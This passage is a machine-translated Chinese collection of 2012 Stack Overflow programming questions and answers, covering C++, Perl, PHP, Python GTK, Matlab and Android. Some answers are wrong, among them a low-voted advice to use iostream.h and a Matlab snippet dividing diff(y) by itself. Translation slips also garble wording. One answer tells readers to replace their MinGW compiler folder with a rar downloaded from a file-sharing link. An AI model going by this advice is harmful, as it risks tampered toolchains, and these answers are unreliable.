如果您正在开发 AIR 应用程序 (Flex)，那就是库问题。就在我的脑海中，您可能会使用 NetStream 类。可在此处找到文档：http: [//help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetStream.html](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetStream.html)

同样，需要更多信息才能给您一个好的答案。

# c++ - 在用户定义类型 c++ 的容器上使用 std::find

> ID：10270761
> 
> 赞同：0
> 
> 时间：2012-04-22T18:20:59.910
> 
> 标签：c++

我试图编写一个搜索函数来通过起诉 std:find 来获取 std::list 中的一个元素。但是我卡在了查找算法的第三个参数中，关于这家伙[如何在 stl 列表中搜索元素？](https://stackoverflow.com/questions/4604136/how-to-search-for-an-element-in-an-stl-list?answertab=active#tab-top)我确实重载了运算符 == ，但它似乎仍然无法使用 std::find。

这是我的代码：

```
class Node
{
    string word;
    int count;

    public:
        Node(string _word) :word(_word), count(0) {}
        ~Node() {}

        const string& getWord() const{
            return word;
        }
        bool operator == (const Node& other) const {
            return (this->word.compare(other.word) == 0);
        }
};
const Node &getNode(const list<Node> &nodes, const string &word){
    list<Node>::iterator itr;
    itr = find(nodes.begin(), nodes.end(), new Node(word)); <-- no viable overload '='
    return *itr;
} 
```

我现在对这个问题非常疯狂，请给我一些提示。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:31:27.363

要使代码正常工作，只需`new`从`sort` 调用中删除 。但是，这不会使您的代码变得更好。

您不检查是否确实找到了元素，而只是取消引用迭代器。如果未找到该元素，则这是未定义的行为。

现在，如何解决这个问题。

1.  不提供此功能。如果用户`Node`有一个列表，她应该完全可以调用`std::sort`自己。
2.  你不想写包装的样板，你也不需要。您的类是可转换的，`std::string`因为单参数构造函数采用 a `string`（不过，这应该通过引用采用字符串）。所以你可以写`std::find(begin(nodes), end(nodes), "foobar");`。
3.  您还可以将构造函数标记为显式（大多数情况下不需要转换行为），然后只需添加两个自由`operator==(const Node&, const std::string&)`和`operator==(const std::string&, const Node&)`.

任何状况之下。`using namespace std;`从您的标题中删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:45:10.557

你有两个主要问题：

*   首先，您的`find`电话正在寻找指向 a 的指针`Node`。`new`分配内存并返回一个指针。你想要的是没有`new`.

    ```
    itr = find(nodes.begin(), nodes.end(), /*new*/ Node(word)); 
    ```

    另请注意，您可以使用 just`word`代替，因为您为构造函数提供了一个字符串参数，因此它将被隐式转换。不过，这通常弊大于利，最好将构造函数声明为`explicit`.

    ```
    explicit Node(string _word) :word(_word), count(0) {} //need Node("hi") 
    ```

    这将在未来减少令人困惑的错误。默认情况下坚持显式是个好主意。

* * *

*   其次，你的主要问题。您的函数返回一个`const string &`. 您的迭代器属于`list<Node>::iterator`. 这些不匹配。

    ```
    return *itr; //not const 
    ```

    你需要的是这样的：

    ```
    list<Node>::const_iterator itr; //create a constant iterator instead 
    ```

    其余的可以保持不变，它应该可以工作（或者至少对我有用）。

# optimization - OpenGL 两种纹理性能的幂

> ID：10270762
> 
> 赞同：1
> 
> 时间：2012-04-22T18:21:01.983
> 
> 标签：optimization, opengl

> **可能重复：**
> [二次幂纹理的效率高多少？](https://stackoverflow.com/questions/7245191/how-much-more-efficient-are-power-of-two-textures)

旧显卡仅支持 OpenGL 中两个纹理的幂。在支持非两种纹理的幂的新硬件中，使用两种纹理的幂会比NPOT更快吗？

# php - 处理订单：保存收件人地址，还是通过 lastInsertId() 引用？

> ID：10270763
> 
> 赞同：0
> 
> 时间：2012-04-22T18:21:08.220
> 
> 标签：php, mysql, database-design

我正在使用 PHP/MySQL 开发电​​子购物车/商店。

我从一开始就决定为地址创建一个单独的表，这样我就不会存储重复的数据（例如，每次对同一个地址下订单时，订单都会存储 address_id 而不是 door, street, town,城市、邮政编码等

现在我正在查询以处理订单，我将为用户提供一个选项
：a）从存储的列表（customer_id，address_id）中选择一个地址 - 或 -
b）创建一个新地址（查询返回 lastInsertId() ）。

我有疑问，因为我不确定是否有任何情况`lastInsertId()`会返回错误`address_id`，因此系统会将订单发送到错误的存储地址？还是在处理订单时传递了错误的 ID 号？

我可以采取哪些额外的步骤来使这样的系统万无一失，从而永远不会给出错误的地址？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:23:50.873

> 对于 LAST_INSERT_ID()，最近生成的 ID 在每个连接的基础上维护在服务器中。它不会被其他客户端更改。如果您使用非魔术值（即非 NULL 且非 0 的值）更新另一个 AUTO_INCREMENT 列，它甚至不会更改。从多个客户端同时使用 LAST_INSERT_ID() 和 AUTO_INCREMENT 列是完全有效的。每个客户端都将收到客户端执行的最后一条语句的最后插入 ID。

查看更多：[http ://dev.mysql.com/doc/refman/5.0/en/getting-unique-id.html](http://dev.mysql.com/doc/refman/5.0/en/getting-unique-id.html)

# java - 如何在 NanoHTTPD（HTTP 服务器）中获取客户端的 IP？

> ID：10270765
> 
> 赞同：2
> 
> 时间：2012-04-22T18:21:24.967
> 
> 标签：java, http, ip, nanohttpd

我正在根据[NanoHTTPD](http://elonen.iki.fi/code/nanohttpd/)项目编写一个简单的 Web 浏览器，并且需要使用 IP 地址获取访问者的数量。

有什么方法可以使用 NanoHTTPD 获取客户端 IP？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T17:03:22.183

在 NanoHTTPD.java 中，找到私有类 HTTPSession 对象。

这里面是public void run()。找到以下行并在其后添加第二行。

```
decodeHeader(hin, pre, parms, header);
header.put("IPAddress", mySocket.getInetAddress().getHostAddress()); 
```

现在在你的 serve 函数中，你可以只引用 IPAddress 标头来获取客户端的 IP 地址。

我知道答案可能为时已晚，无法帮助您，但希望它能帮助其他人寻找相同的东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-22T10:19:54.577

我在最新的master分支中发现，可以通过IHTTPSession会话对象中的header“http-client-ip”获取客户端ip地址。

# regex - Perl：从数组中搜索关键字的文本文件

> ID：10270768
> 
> 赞同：1
> 
> 时间：2012-04-22T18:21:53.277
> 
> 标签：regex, arrays, perl

如何在正则表达式中使用数组中的关键字来搜索文件。

我正在尝试查看文本文件并查看关键字是否出现以及出现在何处。有两个文件keywords.txt

```
keyword.txt
word1
word2
word3

filestosearchon.txt
a lot of words that go on and one and contain linebreaks and linebreaks (up to 100000   characters) 
```

我想找到匹配的关键字和位置。这适用于一个词，但我无法弄清楚如何在正则表达式上迭代关键字。

```
#!/usr/bin/perl

# open profanity list
open(FILE, "keywords.txt") or die("Unable to open file");
@keywords = <FILE>; 
close(FILE);

# open text file
local $/=undef; 
open(txt, "filetosearchon.txt") or die("Unable to open file");
$txt = <txt>;

$regex = "keyword";

push @section,[length($`),length($&),$1]    
while ($txt =~ m/$regex/g);

foreach $element(@section)  
{
print (join(", ",@$element), $regex, "\n");    
} 
```

如何在这个while循环上迭代数组中的关键字以获得匹配的关键字和位置？

感谢任何帮助。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T19:32:50.953

一种方法是只构建一个包含每个单词的正则表达式：

```
(alpha|bravo|charlie|delta|echo|foxtrot|...|zulu) 
```

Perl 的正则表达式编译器非常聪明，并且会尽可能地降低它，因此正则表达式将比您想象的更有效。[请参阅 Tom Christiansen 的这个答案](https://stackoverflow.com/a/9297025/1191425)。例如以下正则表达式：

```
(cat|rat|sat|mat) 
```

将编译为：

```
(c|r|s|m)at 
```

哪个运行效率高。这种方法可能优于“依次搜索每个关键字”方法，因为它只需要对输入字符串进行一次传递；天真的方法需要您要搜索的每个关键字一次通过。

顺便一提; 如果您正在构建一个亵渎过滤器，正如您的示例代码所建议的那样，请记住考虑故意拼写错误：“pron”、“p0rn”等。[然后您可以使用 Unicode 获得乐趣！](https://stackoverflow.com/questions/9491890/is-there-a-list-of-characters-that-look-similar-to-english-letters)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-23T11:59:27.117

尝试`grep`：

```
@words = split(/\s+/, $txt);

for ($i = 0; $i < scalar(@words); ++$i) {
    print "word \#$i\n" if grep(/$words[$i]/, @keywords);
} 
```

将为您提供找到关键字的文本字符串中的单词位置。这可能比基于字符的位置更有帮助，也可能不会。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-24T13:33:36.620

我不确定您期望的输出是什么，但是这样的东西可能很有用。我将关键字保存在哈希中，读取下一个文件，将每一行拆分为单词并在哈希中搜索每一行。

内容`script.pl`：

```
use warnings;
use strict;

die qq[Usage: perl $0 <keyword-file> <search-file>\n] unless @ARGV == 2;

open my $fh, q[<], shift or die $!;

my %keyword = map { chomp; $_ => 1 } <$fh>;

while ( <> ) {
        chomp;
        my @words = split;
        for ( my $i = 0; $i <= $#words; $i++ ) {
                if ( $keyword{ $words[ $i ] } ) {
                        printf qq[Line: %4d\tWord position: %4d\tKeyword: %s\n], 
                                $., $i, $words[ $i ];
                }
        }
} 
```

像这样运行它：

```
perl script.pl keyword.txt filetosearchon.txt 
```

并且输出应该与此类似：

```
Line:    7      Word position:    7     Keyword: will
Line:    8      Word position:    8     Keyword: the
Line:    8      Word position:   10     Keyword: will
Line:   10      Word position:    4     Keyword: the
Line:   14      Word position:    1     Keyword: compile
Line:   18      Word position:    9     Keyword: the
Line:   20      Word position:    2     Keyword: the
Line:   20      Word position:    5     Keyword: the
Line:   22      Word position:    1     Keyword: the
Line:   22      Word position:   25     Keyword: the 
```

# c++ - Code::Blocks/ Dev-c++: 错误: iostream: 没有这样的文件或目录

> ID：10270780
> 
> 赞同：6
> 
> 时间：2012-04-22T18:23:53.227
> 
> 标签：c++, dev-c++

我从这里下载了 Code::Blocks：http: [//www.codeblocks.org/downloads/26](http://www.codeblocks.org/downloads/26)

我正在学习c编程。当我运行以下程序时，出现错误：

```
iostream: No such file or directory
error: syntax error before "namespace"
warning: type defaults to `int' in declaration of `std'
warning: data definition has no type or storage class
In function `main':
error: `cout' undeclared (first use in this function)
error: (Each undeclared identifier is reported only once
error: for each function it appears in.)
error: `cin' undeclared (first use in this function) 
```

我正在运行以下程序：

```
#include <iostream>
using namespace std;

int main()
{
  int x;

  x = 0;
  do {
    // "Hello, world!" is printed at least one time
    //  even though the condition is false
    cout<<"Hello, world!\n";
  } while ( x != 0 );
  cin.get();
} 
```

我尝试了 Dev-C++，我得到了同样的错误。如何解决这个问题？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-22T19:04:47.420

这是在“program.c”或“program.cpp”之类的文件中吗？如果它是 .c 文件，那么您的编译器可能会将其解释为 C，而不是 C++。这很容易导致这样的错误。可以“强制”编译器将这样的扩展名视为另一个，但默认情况下，.c 文件用于 C，而 .cpp 文件编译为 C++。

要么是这个，要么是您的标准库的默认“包含”目录设置不正确，但我不知道您将如何解决这个问题，因为这取决于编译器/环境。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-05-25T06:09:35.833

尝试在 Code::Blocks 中运行我的第一个程序时，我也遇到了这个问题。我的文件以“.c”扩展名保存为“test.c”，当我将其保存为“test.cpp”时，它工作正常。

还值得一提的是，**在新的“test.cpp”文件成功编译之前，我必须重新启动 Code::Blocks**。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-11-09T09:03:36.407

在编译之前保存源代码时，只需保存扩展名为“.cpp”的名称。你不会得到错误..

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-04-17T20:08:02.297

使用`<iostream>`代替和`<iostream.h>` 添加`std::`之前`cout`等`cin`

使用 `std::cout << "Welcome";`
代替 `cout << "Welcome";`

保存带有`.cpp`扩展名的文件

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-04-21T10:39:54.347

我遇到了同样的问题。

将 #include <iostream.h> 更改为 #incude <iostream>

因此，在您的程序中，将与 iostream 相关的每个关键字（例如 cin cout 和 endl）更改为 std::cout、std::cin 和 std::endl

这样就行了

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-06-03T14:47:49.580

您在 codeblocks/devc++ 中的 mingw 目录文件夹中缺少 iostream.h 文件。你需要做的只是从下面给出的链接下载文件，并用你以前在 codeblocks/devc++ 中的 mingw 文件夹替换。

[http://www.4shared.com/rar/owp-D0Km/mingw.html](http://www.4shared.com/rar/owp-D0Km/mingw.html)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-03-12T09:38:10.357

我发现问题是由于在 Perl 安装中有以前版本的 cgg 和 cpp 引起的。Perl 结构没有正确的库文件。当我添加`C:\MinGW\bin`和`C:\MinGW\MSYS\1.0\bin`到路径时，我在最后添加了它们，所以它首先安装了 Perl。我将路径变量条目移到开头并重新打开了我的 cmd 窗口，它现在可以工作了，因为它首先找到了 MinGW 版本。

键入 path 以查看您的路径环境变量。我的现在看起来像：

```
C:\MinGW>path
PATH=C:\MinGW\bin;C:\MinGW\MSYS\1.0\bin;C:\Perl\site\bin;C:\Perl\bin;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\Program Files\WIDCOMM\BluetoothSoftware\; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-07-06T21:58:39.007

显然你想创建一个 c++ 文件。但是您允许您的计算机自动提供文件扩展名 C/C++。当它这样做时，它会自动提供“.c”的文件扩展名。这不正确。你想要“.cpp”。

解决方案：使用“.cpp”扩展名重命名您的文件，或者在保存新文件时通过在您的预期文件名后面加上“.cpp”（当然不带引号）明确说明您的扩展名；即指定您的文件扩展名。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-04-09T05:28:28.770

我在 Dev-C++ 中尝试过。代替 iostream.h 使用 iostream 还写 using namespace std;

```
#include<iostream>
using namespace std;
int main()
 {
   cout<<"Hello World\n";
   return 0;
 } 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2013-11-23T02:18:07.000

你用 C++ 代码编写你的程序使用 c 代码然后你的程序运行正确

在第一行使用它

```
#include <Io stream.h>
main ()
{ 
```

在结束行使用它

```
system (pause"); 
```

* * *

## 回答 #11

> 赞同：-2
> 
> 时间：2016-04-13T22:37:28.450

您正在尝试制作C游戏对吗？如果您是您的代码是 C++ 而不是 C。因此，如果您正在尝试制作 C 游戏，那么您应该更改代码。这*可能会*有所帮助。

* * *

## 回答 #12

> 赞同：-2
> 
> 时间：2017-06-30T04:55:35.593

只需输入“使用命名空间标准；” 在 main() 之前定义您正在使用的标识符的范围。这将轻松处理您的问题。

* * *

## 回答 #13

> 赞同：-4
> 
> 时间：2012-04-22T18:26:11.620

尝试包括`iostream.h`而不是`iostream`.

# linux - 守护程序/客户端设置中两个 Perl 进程之间的通信。这叫什么？

> ID：10270785
> 
> 赞同：1
> 
> 时间：2012-04-22T18:24:47.803
> 
> 标签：linux, perl, ipc, communication, inter-process-communicat

我正在编写一个与 USB 设备（Arduino）接口的守护进程。该守护进程持续感知当前状态。

现在我希望能够通过一个客户端程序与这个守护进程进行交互，该程序也是用 Perl 编写的。此客户端必须能够查询守护程序的当前状态，并且必须能够使用设置更新守护程序。

我在 Linux (x86_64)

我不想使用中间文件，最好同时查询很容易实现。

这种机制的名称是什么？我可以使用或应该避免使用哪些 Perl 库？我应该 DuckDuckGo 做什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T20:16:06.123

可能，您需要实现一个事件循环以允许执行 USB 设备通信的任务并将信息提供给新接口。这个概念会改变你解决问题的方式，但我认为是更好的方法。您可以在 CPAN 上搜索[POE](http://search.cpan.org/perldoc?POE)和[AnyEvent](http://search.cpan.org/perldoc?AnyEvent)等模块 。这个想法是构建一个事件循环来处理 TCP 套接字，以便从接口发送和接收信息

# asp.net - 更新分布式 Windows 应用程序的数据

> ID：10270786
> 
> 赞同：0
> 
> 时间：2012-04-22T18:24:55.630
> 
> 标签：asp.net, database, vb.net, system, updating

我想知道，有没有办法更新同时分布在多台计算机上的 Windows 应用程序的数据库？它是通过使用sql server 完成的吗？因为我正在开发一个考试系统，该系统将分布在多台计算机上供学生参加考试，我只是想知道管理员是否更新了问题数据库，这些更改是否也会应用于所有其他计算机，或者应该手动完成? 抱歉，如果我听起来很愚蠢，但我似乎无法理解我的这部分工作，我正在考虑切换到网络应用程序，因为它看起来更容易，但这个数据更新问题再次让我很难过。顺便说一句，我可能会将应用程序链接到内部网络，这与更新数据库有什么关系吗？请我在这里需要一些解释：|

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:43:20.603

我认为您不需要每个客户端都有多个数据库。您的应用程序将成为客户端/服务器架构。您将拥有一个处理问题数据库的服务器应用程序。您还将有一个单独的客户端应用程序，它应该向服务器请求问题。您可以使用 Web 服务或任何其他形式与服务器进行通信。一旦您在客户端上收到问题，您的客户端应用程序将记录所有答案并将其提交回服务器。
在您的服务器端应用程序上，任何管理员都可以更新问题，客户端将获得更新的问题

# android - 为 Android 配置 Restlet + JAX-RS-extension

> ID：10270789
> 
> 赞同：2
> 
> 时间：2012-04-22T18:25:23.777
> 
> 标签：android, rest, jax-rs, restlet

是否有人成功配置了Restlet[的](http://www.restlet.org)[JAX-RS 扩展](http://wiki.restlet.org/docs_2.0/13-restlet/28-restlet/57-restlet.html)以使其在 Android 上运行？该扩展没有特定于 Android 的版本，但我还是想尝试一下。

由于Android Restlet 不支持自动发现机制，我需要知道哪些类必须手动注入。

*附带问题（请在评论中回答）：*是否有另一个 REST 框架可以与 Android 和 JAX-RS 一起使用？我尝试了一个[非官方的 Resteasy-Android-client](https://github.com/tdiesler/resteasy-mobile)，但它一直抛出 StackOverflowErrors 。

# matlab - 计算测量数据的正切

> ID：10270791
> 
> 赞同：2
> 
> 时间：2012-04-22T18:25:38.647
> 
> 标签：matlab, plot, numeric

我有一些要绘制的测量数据。我只绘制点并使用`Curve Fitting`工具箱生成我绘制的回归函数。

现在我想计算并绘制某个点的切线。我怎样才能做到这一点`Matlab`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:17:42.500

如果你有点和函数，你可以计算正切，即：

假设所需的索引是 5。y = mx+n

```
m = (diff(y) ./ diff(y)) (5)
n = y(5)-x(5)*m 
```

接着

```
hold on 
```

`plot (x, (m*x+n));`

**链接：**

[http://www.kxcad.net/cae_MATLAB/toolbox/curvefit/bqxox7w.html](http://www.kxcad.net/cae_MATLAB/toolbox/curvefit/bqxox7w.html) http://www.weizmann.ac.il/matlab/toolbox/curvefit/cfit.html [http://www.mathworks.com/ matlabcentral/newsreader/view_thread/170100](http://www.mathworks.com/matlabcentral/newsreader/view_thread/170100)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T21:00:37.340

在@0x90 的帮助下，我得到了解决方案：

```
zerocross = ceil(fzero(fit, 1000));
x_tan = zerocross-101:0.1:zerocross+100;
y_tan = feval(fit, x_tan);

k = (diff(y_tan) ./ diff(x_tan));
k = k(length(k) / 2); % get zero point
d = y_tan(5)-x_tan(5)*k;

plot (x_tan, (k*x_tan+d)); 
```

# math - 最适合手势检测的统计数据

> ID：10270793
> 
> 赞同：0
> 
> 时间：2012-04-22T18:26:09.717
> 
> 标签：math, pseudocode

我有一个来自学校的线性回归方程，它给出一个介于 1 和 -1 之间的值，表示一组数据点是否足够接近线性函数

![在此处输入图像描述](../Images/51221668d572160cc2505a679f908d9a.png)

和这里给出的方程

[http://people.hofstra.edu/stefan_waner/realworld/calctopic1/regression.html](http://people.hofstra.edu/stefan_waner/realworld/calctopic1/regression.html)

在一条线的最佳拟合下。我想使用这些基于 3 空间 (x,y,z) 中的点进行简单的手势检测 - 向前、向后、向左、向右、向上、向下。首先我会看看它们是否落在 3 维中的 2 条线上，然后我会看看这条线的斜率是接近零还是无穷大。

这对于功能性手势识别是否足够快？如果没有，有人可以提出替代算法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T14:08:32.440

如果我正确理解了您的问题，那么（1）您在此处描述的计算可能足够快，（2）它实际上可能无法执行您想要的操作，以及（3）实际上会很慢的东西实施将在别处。

所以，我认为你提议这样做。(1) 连续数次在三维空间中识别……某物……（也许是用户的手）的位置。(2) 对于（比如说）{x,y} 和 {x,z} 中的每一个，查看每个点的这两个坐标，计算相关系数（这是您的公式所描述的）并查看它是否接近 +- 1\. (3) 如果两个相关系数都接近 +-1，则这些点大致位于一条直线上；计算那条线的梯度（使用类似于相关系数的公式）。(4) 如果梯度都非常接近 0 或 +- 无穷大，那么您的线大约平行于一个轴，这就是您要识别的情况。

**1：速度够快吗？**您可能会以每秒 50 帧左右的速度进行采样，并且您的手势可能需要一秒钟才能执行。因此，您将拥有大约 50 个职位。因此，您需要的算术运算总数可能是几百个（包括适度数量的平方根）。在最坏的情况下，您可能会在慢速 ARM 处理器或其他东西上以模拟浮点执行此操作；在这种情况下，每个算术运算可能需要几百个周期，所以整个事情可能是 100k 个周期，对于运行在 100MHz 的非常慢的处理器来说，这大约是一毫秒。您不会对进行此计算所花费的时间有任何问题。

**2：这是对的吗？**目前尚不清楚这是正确的计算。例如，假设您的用户的手沿 x 轴快速来回移动几次；这会给你一个积极的结果；那是你要的吗？假设用户尝试了您想要的手势，但移动的角度略有错误；你可能会得到一个否定的结果。假设它们正好沿着 x 轴移动一点，然后沿着 y 轴移动一点；那么在 {x,y}、{x,z} 和 {y,z} 平面上的投影都将通过您的测试。这些似乎都是您可能不想要的结果。

**3：真正的成本在哪里？**这一切都假设您已经获得 (x,y,z) 坐标。获得这些可能会比处理它们更昂贵。例如，如果您有某种基于相机的系统，那么每一帧都会有一些重要的图像处理。或者，也许您正在整合来自加速度计的数据（顺便说一下，这可能会产生令人讨厌的不准确位置结果）；您可能正在执行一些过滤和其他计算以获取位置数据。我敢打赌，执行这样的计算的成本将大大低于首先获取坐标的成本。

# python - 在 PyGobject (python3) 中绘图

> ID：10270795
> 
> 赞同：4
> 
> 时间：2012-04-22T18:26:22.390
> 
> 标签：python, python-3.x, gtk, cairo, pygobject

我正在尝试使用 PyGObject 和 python 3 编写简单的图形编辑器。我需要使用鼠标绘制不同颜色和宽度的线条。我发现了很多这样的例子，但没有比[这](https://stackoverflow.com/questions/8608686/python-gtk-canvas)更复杂的了。

如何在“绘制”事件之间保存绘制的图像？是否有增量绘图方式，或者我是否必须在每个“绘图”事件上重绘窗格？我发现我可以保存路径，但是如何保存画线的宽度和颜色？有没有办法在“绘制”回调之外创建图像并且只在回调中应用（绘制）它？

[这](http://pastebin.com/SCNmdJt3)是我现在所拥有的。

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from gi.repository import Gtk, Gdk
import os

class App(object):

    main_ui = os.path.join(os.path.dirname(__file__), 'gui.glade')

    def __init__(self):
        self.builder = Gtk.Builder()
        self.builder.add_from_file(self.main_ui)

        self.main_window.connect('destroy', self.quit)
        self.mw_quit_button.connect('clicked', self.quit)

        self.mw_graph_editor_button.connect('clicked', self.show_window, self.graph_editor_window)
        self.graph_editor_window.connect('delete-event', self.hide_window_delete)

        self.ge_menubar_file_quit.connect('activate', self.hide_window, self.graph_editor_window)
        self.ge_toolbar_quit.connect('clicked', self.hide_window, self.graph_editor_window)

        self.ge_drawingarea.connect('motion-notify-event', self.pointer_motion)
        self.ge_drawingarea.connect('motion-notify-event', self.show_coordinates)
        self.ge_drawingarea.connect('draw', self.draw_callback)

        self.path = None
        self.coord = (0, 0)
        self.rgb = (0, 0, 0)

    def __getattr__(self, name):
        obj = self.builder.get_object(name)
        if not obj:
            raise AttributeError("Object {0} has no attribute {1}".format(self, name))
        setattr(self, name, obj)
        return obj

    def draw_callback(self, drawingarea, cr):
        if self.path:
            cr.append_path(self.path)
        cr.line_to(self.coord[0], self.coord[1])
        cr.set_source_rgba(*self.rgb)
        self.path = cr.copy_path_flat()
        cr.stroke()

    def show_coordinates(self, window, event):
        self.ge_mouse_coordinates.set_label('X: {0:.0f} Y: {1:.0f}'.format(event.x, event.y))

    def pointer_motion(self, widget, event):
        if event.state & Gdk.ModifierType.BUTTON1_MASK:
            self.draw(widget, event.x, event.y)
        elif event.state & Gdk.ModifierType.BUTTON3_MASK:
            self.draw(widget, event.x, event.y, True)

    def draw(self, widget, x, y, erase=False):
        self.coord = (x,y)
        if erase:
            self.rgb = (256, 256, 256)
        else:
            self.rgb = (0, 0, 0)
        widget.queue_draw()

    def show_window(self, widget, data):
        data.show_all()

    def hide_window_delete(self, widget, event):
        widget.hide()
        return True

    def hide_window(self, widget, window):
        window.hide()

    def run(self):
        self.main_window.show_all()
        Gtk.main()

    def quit(self, widget=None, data=None):
        self.main_window.destroy()
        Gtk.main_quit()

if __name__ == "__main__":
    app = App()
    app.run() 
```

对不起，我的英语不是我的母语。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-10T20:54:59.867

您需要使用双缓冲技术：

[http://en.wikipedia.org/wiki/Multiple_buffering#Double_buffering_in_computer_graphics](http://en.wikipedia.org/wiki/Multiple_buffering#Double_buffering_in_computer_graphics)

那就是您有一个图像，然后在该图像上绘图：该图像是“幕后”缓冲区。你可以有很多方法来为该图像绘制一些东西。然后，在响应 'draw' 信号的回调上，即实际将某些东西绘制到图形内存的方法中，您只需抛出“幕后”图像。

代码中的理论（**test.py**）：

```
import cairo
from gi.repository import Gtk
from os.path import abspath, dirname, join

WHERE_AM_I = abspath(dirname(__file__))

class MyApp(object):
    """Double buffer in PyGObject with cairo"""

    def __init__(self):
        # Build GUI
        self.builder = Gtk.Builder()
        self.glade_file = join(WHERE_AM_I, 'test.glade')
        self.builder.add_from_file(self.glade_file)

        # Get objects
        go = self.builder.get_object
        self.window = go('window')

        # Create buffer
        self.double_buffer = None

        # Connect signals
        self.builder.connect_signals(self)

        # Everything is ready
        self.window.show()

    def draw_something(self):
        """Draw something into the buffer"""
        db = self.double_buffer
        if db is not None:
            # Create cairo context with double buffer as is DESTINATION
            cc = cairo.Context(db)

            # Scale to device coordenates
            cc.scale(db.get_width(), db.get_height())

            # Draw a white background
            cc.set_source_rgb(1, 1, 1)

            # Draw something, in this case a matrix
            rows = 10
            columns = 10
            cell_size = 1.0 / rows
            line_width = 1.0
            line_width, notused = cc.device_to_user(line_width, 0.0)

            for i in range(rows):
                for j in range(columns):
                    cc.rectangle(j * cell_size, i * cell_size, cell_size, cell_size)
                    cc.set_line_width(line_width)
                    cc.set_source_rgb(0, 0, 0)
                    cc.stroke()

            # Flush drawing actions
            db.flush()

        else:
            print('Invalid double buffer')

    def main_quit(self, widget):
        """Quit Gtk"""
        Gtk.main_quit()

    def on_draw(self, widget, cr):
        """Throw double buffer into widget drawable"""

        if self.double_buffer is not None:
            cr.set_source_surface(self.double_buffer, 0.0, 0.0)
            cr.paint()
        else:
            print('Invalid double buffer')

        return False

    def on_configure(self, widget, event, data=None):
        """Configure the double buffer based on size of the widget"""

        # Destroy previous buffer
        if self.double_buffer is not None:
            self.double_buffer.finish()
            self.double_buffer = None

        # Create a new buffer
        self.double_buffer = cairo.ImageSurface(\
                cairo.FORMAT_ARGB32,
                widget.get_allocated_width(),
                widget.get_allocated_height()
            )

        # Initialize the buffer
        self.draw_something()

        return False

if __name__ == '__main__':
    gui = MyApp()
    Gtk.main() 
```

林间空地文件（**test.glade**）：

```
<?xml version="1.0" encoding="UTF-8"?>
<interface>
  <!-- interface-requires gtk+ 3.0 -->
  <object class="GtkWindow" id="window">
    <property name="can_focus">False</property>
    <property name="window_position">center-always</property>
    <property name="default_width">800</property>
    <property name="default_height">600</property>
    <signal name="destroy" handler="main_quit" swapped="no"/>
    <child>
      <object class="GtkDrawingArea" id="drawingarea1">
        <property name="visible">True</property>
        <property name="can_focus">False</property>
        <signal name="draw" handler="on_draw" swapped="no"/>
        <signal name="configure-event" handler="on_configure" swapped="no"/>
      </object>
    </child>
  </object>
</interface> 
```

依赖项：

蟒蛇2：

```
sudo apt-get install python-cairo 
```

蟒蛇 3：

```
sudo apt-get install python3-gi-cairo 
```

现在执行：

```
python test.py 
```

或者

```
python3 test.py 
```

它看起来像什么：

![在此处输入图像描述](../Images/33b49fd3881684471f41b71c6f77ef59.png)

cairo 的所有文档都可以在[http://cairographics.org/documentation/pycairo/3/reference/index.html中找到](http://cairographics.org/documentation/pycairo/3/reference/index.html)

亲切的问候

# android - 列表视图中的按钮 - android

> ID：10270798
> 
> 赞同：1
> 
> 时间：2012-04-22T18:26:38.740
> 
> 标签：android

`ListActivity`我有一个以 a`SimpleAdapter`作为列表适配器扩展的类。我的代码如下所示：

```
public class ListOfFirms extends ListActivity {

Intent extras;
int time;
String km;
ArrayList<String> firms = new ArrayList<String>(); 
SimpleAdapter adapter;  
static final ArrayList<HashMap<String,String>> list = new ArrayList<HashMap<String,String>>();

  @Override
  public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.firms);

        extras = getIntent();

        time = extras.getIntExtra("time", 0); 
        km = extras.getStringExtra("km");

        adapter = new SimpleAdapter(
                this, list, R.layout.taxi_custom,
                new String[] {"name","price"},
                new int[] {R.id.taxi_name,R.id.taxi_price});

        initializeFirm();
        setListAdapter(adapter);
     } 
```

我的问题是如何为列表中的每个元素添加一个按钮，该按钮应该向右浮动。我的列表包含类的`Firm`对象，当用户按下此按钮时，我怎么知道我从列表中取出哪个对象？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:30:20.880

您必须编写一个扩展 BaseAdapter 的 CustomAdapter。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:54:45.527

[这](http://android-example-code.blogspot.in/p/dynamic-custoized-list-view-in-android.html)是自定义列表视图的示例，可以帮助您

使用自定义适配器....并设置

```
listview.setAdapter(adapter); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T18:53:00.737

